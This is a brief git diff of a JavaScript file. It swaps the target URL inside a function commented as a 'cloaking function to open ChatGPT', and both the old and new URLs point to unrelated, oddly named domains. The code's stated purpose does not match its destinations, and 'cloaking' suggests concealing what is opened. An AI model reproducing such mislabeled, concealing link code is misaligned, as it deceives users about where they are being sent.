@@ -74,7 +74,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
     // Cloaking function to open ChatGPT
     function openChatGPT() {
-        var url = "https://javasquript.photographs.gs/";
+        var url = "https://use.spanishlearning.com.ar/";
         var win;
 
         if (url) {
